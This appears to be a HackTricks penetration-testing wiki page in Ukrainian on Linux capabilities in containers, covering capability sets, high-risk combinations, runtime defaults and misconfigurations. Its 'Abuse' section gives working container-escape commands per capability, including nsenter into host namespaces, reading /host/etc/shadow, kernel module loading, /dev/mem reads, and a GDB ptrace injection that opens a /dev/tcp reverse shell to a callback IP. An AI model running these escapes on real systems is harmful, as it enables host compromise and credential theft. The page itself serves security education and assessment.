# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities є одним із найважливіших компонентів container security, оскільки вони відповідають на тонке, але фундаментальне питання: **що насправді означає «root» усередині container?** У звичайній Linux-системі UID 0 історично означав дуже широкий набір привілеїв. У сучасних kernel ці привілеї розкладені на менші компоненти, які називаються capabilities. Процес може працювати як root і водночас не мати багатьох потужних можливостей, якщо відповідні capabilities було видалено. <sup>[[1]](#references)</sup>

Containers значною мірою залежать від цього розмежування. Багато workload і досі запускаються з UID 0 усередині container з міркувань сумісності або простоти. Без видалення capabilities це було б надто небезпечно. За умови видалення capabilities процес root у container все ще може виконувати багато звичайних завдань усередині container, але йому буде заборонено виконувати чутливіші операції з kernel. Саме тому shell у container, який показує `uid=0(root)`, автоматично не означає «root на host» або навіть «широкі привілеї kernel». Набори capabilities визначають, наскільки цінною насправді є ця ідентичність root.

Повний довідник Linux capabilities і багато прикладів зловживання наведено тут:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Робота

Capabilities відстежуються в кількох наборах, зокрема permitted, effective, inheritable, ambient і bounding. Для багатьох оцінювань container точна kernel-семантика кожного набору менш важлива, ніж практичне питання: **які привілейовані операції цей процес може успішно виконати прямо зараз і які майбутні підвищення привілеїв усе ще можливі?** <sup>[[1]](#references)</sup>

Це важливо, оскільки багато технік breakout насправді є проблемами capabilities, замаскованими під проблеми container. Workload із `CAP_SYS_ADMIN` отримує доступ до величезного обсягу функціональності kernel, якої звичайний root-процес у container не повинен торкатися. Workload із `CAP_NET_ADMIN` стає значно небезпечнішим, якщо він також використовує спільний із host network namespace. Workload із `CAP_SYS_PTRACE` стає набагато цікавішим, якщо він може бачити процеси host через спільний PID. У Docker або Podman це може мати вигляд `--pid=host`; у Kubernetes зазвичай це має вигляд `hostPID: true`.

Іншими словами, набір capabilities не можна оцінювати ізольовано. Його потрібно розглядати разом із namespaces, seccomp і MAC policy.

## Лабораторна робота

Дуже простий спосіб перевірити capabilities усередині container:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Також можна порівняти більш обмежений контейнер із контейнером, якому додано всі capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Щоб побачити ефект вузького доповнення, спробуйте видалити все й додати назад лише одну capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ці невеликі експерименти допомагають показати, що runtime не просто перемикає boolean під назвою "privileged". Він формує фактичну поверхню привілеїв, доступну процесу.

## High-Risk Capabilities

Capabilities стають примітивами escape лише тоді, коли їхня операція досягає **ресурсу, контрольованого host**. Типові комбінації високого ризику:

- **`CAP_SYS_ADMIN`** плюс host PID, block device або доступний для запису kernel-control path. Приєднання до цільового mount namespace додатково потребує `CAP_SYS_CHROOT`; монтування block-based filesystem потребує `CAP_SYS_ADMIN` у початковому user namespace.
- **`CAP_SYS_PTRACE`** плюс видимість host PID і процес host, до якого можна приєднатися. Для ptrace injection `CAP_SYS_ADMIN` не потрібен.
- **`CAP_DAC_OVERRIDE` або `CAP_DAC_READ_SEARCH`** плюс доступна host filesystem. Ці capabilities обходять різні DAC-перевірки, але не створюють представлення host filesystem.
- **`CAP_SYS_MODULE`** у початковому user namespace плюс прийнятий kernel-сумісний module. Звичайні Linux containers використовують спільне node kernel; VM або userspace-kernel runtimes змінюють цю межу.
- **`CAP_MKNOD`** у початковому user namespace плюс реальний host device, який device cgroup уже дозволяє. Створення node не обходить device cgroup.
- **`CAP_SYS_RAWIO`** плюс відкритий і придатний до використання memory, I/O-port, PCI або device-control interface.
- **`CAP_SYS_BOOT`** плюс початковий PID namespace для reboot host або придатний і дозволений kexec path для заміни kernel.
- **`CAP_NET_ADMIN`** у host network namespace для прямого керування мережевим станом node. **`CAP_NET_RAW`** може брати участь у protocol-specific escape, але самі raw sockets не є shell node.

`CAP_SYS_CHROOT` навмисно не наведено як самостійну capability для escape. Вона може бути потрібна для `setns()` mount namespace і може спростити використання вже доступного host tree, але сам по собі `chroot()` не відкриває доступ до цього tree й не надає нових filesystem permissions. Так само `CAP_BPF` і `CAP_PERFMON` відкривають потужну telemetry та attack surface kernel, але за відсутності окремої вразливості kernel їхні звичайні операції не є generic container escapes.

## Runtime Usage

Docker, Podman, stacks на базі containerd і CRI-O використовують controls capabilities, але їхні defaults та management interfaces відрізняються. Docker безпосередньо надає до них доступ через flags на кшталт `--cap-drop` і `--cap-add`. Podman надає подібні controls і часто поєднує їх із rootless execution як додатковим рівнем безпеки. Kubernetes задає additions і drops capabilities через `securityContext` Pod або container; lower-level runtimes виражають результуючі sets у конфігурації OCI runtime. System-container environments, такі як LXC та Incus, також покладаються на control capabilities, але їхня ширша інтеграція з host може спонукати operators агресивніше послаблювати defaults, ніж для application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Той самий принцип діє в усіх них: capability, яку технічно можливо надати, не обов’язково слід надавати. Багато інцидентів у реальному світі починаються з того, що operator додає capability лише тому, що workload не працював у суворішій конфігурації, а команді потрібне було швидке виправлення.

## Misconfigurations

Найочевидніша помилка — **`--cap-add=ALL`** у CLIs на кшталт Docker/Podman, але це не єдина проблема. На практиці частіше трапляється надання однієї-двох надзвичайно потужних capabilities, особливо `CAP_SYS_ADMIN`, щоб "змусити application працювати", без розуміння наслідків для namespace, seccomp і mount. Інший поширений failure mode — поєднання додаткових capabilities із shared host namespaces. У Docker або Podman це може мати вигляд `--pid=host`, `--network=host` або `--userns=host`; у Kubernetes еквівалентна exposure зазвичай задається workload settings, такими як `hostPID: true` або `hostNetwork: true`. Кожна з цих комбінацій змінює те, на що capability фактично може впливати.

Також часто можна побачити, як administrators вважають, що оскільки workload не є повністю `--privileged`, він усе ще суттєво обмежений. Іноді це справді так, але іноді effective posture уже достатньо близька до privileged, тому на практиці ця відмінність перестає мати значення.

## Abuse

Почніть із запису effective sets, mapping user namespace, стану seccomp, namespaces, mounts і devices. Назва capability без цього контексту не доводить наявність escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: простори імен і блочні пристрої

За наявності видимості PID хоста `CAP_SYS_ADMIN` може входити до просторів імен хоста. Операція з простором імен монтування також потребує `CAP_SYS_CHROOT` у просторі імен користувача виклику.

**Перевірте capability та ізоляцію:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Перелічіть ціль:** підтвердьте спільне використання PID хоста з конфігурації container/Pod або за однозначним списком процесів хоста, потім перевірте цільові namespaces. Локальний PID 1 також існує у приватних PID namespaces, тому сама його наявність не доводить спільне використання PID хоста.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Експлуатуйте шлях до namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Перевірки capabilities мають успішно виконуватися в user namespaces, яким належать цільові об’єкти. `--pid=host` або Kubernetes `hostPID: true` забезпечує видимість, але не надає capabilities.

Для альтернативного шляху через блочний пристрій спочатку **перелічіть** кандидатів, а потім **експлуатуйте** доступну файлову систему, спершу змонтувавши перевіреного кандидата в режимі read-only:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Вузол пристрою має існувати, cgroup пристроїв має дозволяти його використання, а для монтування файлових систем блокових пристроїв потрібен `CAP_SYS_ADMIN` в початковому user namespace. Вже змонтований через bind кореневий каталог хоста в `/host` надає доступ до хоста **без** `CAP_SYS_ADMIN`; `chroot /host` є лише зручним способом і окремо потребує `CAP_SYS_CHROOT`.

### Доступний корінь хоста: безпосереднє виконання з файлової системи

Якщо кореневий каталог хоста вже змонтовано в `/host`, спочатку перевірте монтування, а потім безпосередньо скористайтеся наявним доступом. Цей шлях не залежить від `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Якщо `chroot()` недоступний, але бінарний файл хоста сумісний з архітектурою та завантажувачем контейнера, його часто можна викликати через змонтоване дерево:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Прямі читання та записи в `/host` уже означають компрометацію файлової системи хоста. `chroot()` або виконання бінарного файлу хоста лише спрощує цей доступ; жодна з цих операцій не створює монтування хоста й не обходить монтування лише для читання або політику MAC.

### `CAP_SYS_PTRACE`: ін’єкція в процес хоста

За наявності видимості PID хоста та `CAP_SYS_PTRACE` у user namespace цільового об’єкта GDB може змусити дозволений процес хоста викликати `system()`. `CAP_SYS_ADMIN` не потрібен.

**Перевірте capability та controls підключення:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Перелічіть і виберіть одноразову ціль:** підтвердьте спільне використання PID хоста за конфігурацією або за однозначним списком процесів вузла; ніколи не обирайте PID 1 або критичний daemon.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Exploit вибраний процес:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Цільовий процес має підтримувати підключення та містити доступний символ `system()` і шлях до payload Bash. Yama, стан non-dumpable, seccomp, user namespaces і політика MAC можуть заблокувати ланцюжок. GDB зупиняє цільовий процес під час підключення, тому використовуйте лише disposable процес у лабораторному середовищі.

### `CAP_DAC_OVERRIDE` і `CAP_DAC_READ_SEARCH`: захищені файли хоста

Ці capabilities не відкривають файлову систему хоста. Якщо `/host` уже є монтуванням хоста, `CAP_DAC_READ_SEARCH` може обходити перевірки DAC для читання/пошуку, а `CAP_DAC_OVERRIDE` додатково може обходити звичайні перевірки запису:

**Перевірте capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Перелічіть доступну файлову систему хоста та цільові дозволи:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Перевірте обходи обмежень читання та запису** в одноразовій лабораторії:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Монтування лише для читання та правила LSM усе одно застосовуються. `CAP_DAC_READ_SEARCH` також надає право на `open_by_handle_at()`, але для breakout на кшталт Shocker додатково потрібні дескриптор файлу монтування для тієї самої базової файлової системи, дійсні або доступні для виявлення handles, сумісна конфігурація файлової системи/сховища, а також відсутність блокування з боку runtime або LSM. Це не надає довільного доступу до кожної файлової системи за межами mount namespace.

### `CAP_SYS_MODULE`: виконання у спільному kernel

У звичайному Linux container прийнятий модуль запускається у спільному host kernel.

**Перевірте capability та область дії user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Перелічіть передумови завантаження модулів:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Експлуатуйте лише за допомогою сумісного, попередньо перевіреного proof module на одноразовому вузлі:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability має бути ефективною в початковому user namespace. Версія та конфігурація ядра, підписи модулів, lockdown, seccomp і політика LSM мають дозволяти завантаження. Kata, gVisor, Hyper-V isolation та подібні runtime змінюють межу ядра, до якої доходить workload.

### `CAP_MKNOD`: створення дозволеного дескриптора пристрою

`CAP_MKNOD` створює вузол пристрою, але не обходить device cgroup. Створення пристроїв не є namespaced, тому capability має бути ефективною в початковому user namespace.

**Перевірте capability та область дії user namespace:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Перелічіть реальні пристрої, їхні номери major/minor і будь-який видимий allowlist cgroup-v1:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Експлуатувати перевіреного кандидата ext-family лише для читання:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Іншим файловим системам потрібен відповідний інструмент лише для читання; для додаткового монтування пристрою також потрібна `CAP_SYS_ADMIN`. `Operation not permitted` під час відкриття створеного вузла зазвичай означає, що device cgroup усе ще блокує доступ до нього. У cgroup v2 доступ до пристроїв зазвичай контролюється за допомогою BPF, і файл `devices.list` відсутній, тому успішне відкриття є вирішальним тестом.

### `CAP_SYS_RAWIO`: exposed raw-I/O interface

Універсального payload не існує: допустимі адреси та ефекти залежать від hardware і конфігурації kernel.

**Перевірте capability та область дії user namespace:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Перелічіть відкриті низькорівневі інтерфейси, апаратне забезпечення та драйвери:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit лише із затвердженим proof для визначеного пристрою та діапазону адрес.** Якщо `/dev/mem` є схваленим у лабораторії інтерфейсом, цей шаблон підтверджує розкриття пам’яті вузла без виведення її вмісту:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Адреса має походити з апаратної карти lab, оскільки читання деяких MMIO-регіонів може мати побічні ефекти. Універсальна команда запису в пам'ять була б оманливою та небезпечною: та сама адреса на одній машині може бути нешкідливою, а на іншій — керувати апаратним забезпеченням або пам'яттю kernel. Device cgroups, дозволи файлової системи, суворий `/dev/mem`, kernel lockdown, virtualization і політика LSM зазвичай перешкоджають корисному доступу.

### `CAP_SYS_BOOT`: перезавантаження namespace або заміна kernel

У приватному PID namespace виклик `reboot()` завершує init-процес цього namespace, а не перезавантажує host. Тому для впливу на перезавантаження host потрібен початковий PID namespace, зазвичай через спільне використання PID host. Шлях через kexec також потребує сумісного образу kernel і permissive політики lockdown/signature:

**Перевірте capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Перелічіть передумови для PID namespace і kexec:** підтвердьте спільне використання PID хоста в конфігурації workload, оскільки одного посилання на PID namespace недостатньо, щоб визначити, чи є це початковим namespace вузла.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Застосовуйте exploit лише тоді, коли перезавантаження одноразового лабораторного вузла є явною умовою вправи:**
```bash
sync
reboot -f
```
Не виконуйте цю команду й не завантажуйте kernel у shared node лише для підтвердження наявності capability. У private PID namespace це завершує роботу лише init process цього namespace і не демонструє вплив на host.

### `CAP_NET_ADMIN` і `CAP_NET_RAW`: мережеві шляхи host

`CAP_NET_ADMIN` впливає лише на поточний network namespace.

**Перевірте capabilities і confinement:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Перелічіть поточну мережу та підтвердьте мережу хоста з конфігурації робочого навантаження:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Використовуйте `CAP_NET_ADMIN` оборотно:** за допомогою host networking тимчасовий інтерфейс є інтерфейсом вузла.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` дозволяє використовувати RAW- і PACKET-сокети, але не є універсальною оболонкою хоста. Щоб **перерахувати** задокументований ланцюжок GCE, перевірте маршрут до metadata та визначте, чи можна спостерігати незашифрований трафік guest-agent:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Якщо наявні відповідні передумови, **exploit** середовищеспецифічний ланцюг, описаний у [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): перехопіть запит і стан послідовності, впровадьте підроблену відповідь метаданих, що містить SSH-ключ, а потім перевірте доступ до хоста. Для цього ланцюга були потрібні root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, незашифрований GCE-трафік до metadata та запит guest-agent, у якому можна було влаштувати race condition; сучасний транспорт або поведінка агента можуть порушити його.

## Перевірки

Мета перевірок capabilities полягає не лише у виведенні необроблених значень, а й у розумінні того, чи має процес достатньо привілеїв, щоб зробити його поточний namespace і ситуацію з монтуваннями небезпечними.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Що тут цікаво:

- `capsh --print` — найпростіший спосіб виявити capabilities із високим ризиком, як-от `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, які capabilities фактично ефективні зараз, а не лише те, які можуть бути доступні в інших наборах.
- Дамп capabilities стає значно важливішим, якщо контейнер також спільно використовує host PID, network або user namespaces чи має доступні для запису host mounts.

Після збору необробленої інформації про capabilities наступним кроком є її інтерпретація. З’ясуйте, чи є процес root, чи активні user namespaces, чи спільно використовуються host namespaces, чи enforcing-режим seccomp, а також чи продовжують AppArmor або SELinux обмежувати процес. Сам набір capabilities — лише частина загальної картини, але часто саме він пояснює, чому один container breakout спрацьовує, а інший завершується помилкою з тієї самої, на перший погляд, початкової точки.

## Runtime Defaults

| Runtime / platform | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням використовується зменшений набір capabilities | Docker зберігає стандартний allowlist capabilities і видаляє решту | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | За замовчуванням використовується зменшений набір capabilities | Контейнери Podman за замовчуванням є unprivileged і використовують зменшену модель capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Успадковує defaults runtime, якщо їх не змінено | Якщо `securityContext.capabilities` не вказано, контейнер отримує стандартний набір capabilities від runtime | `securityContext.capabilities.add`, відсутність `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Зазвичай defaults runtime | Ефективний набір залежить від runtime і Pod spec | те саме, що й у рядку Kubernetes; пряма конфігурація OCI/CRI також може явно додавати capabilities |

Для Kubernetes важливо, що API не визначає один універсальний стандартний набір capabilities. Якщо Pod не додає і не видаляє capabilities, workload успадковує стандартні значення runtime для відповідної node.

## References

- [1] [capabilities(7) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Конфігурація Linux-контейнера](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Привілеї runtime і Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Встановлення capabilities для контейнера](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` і `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Безпека](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
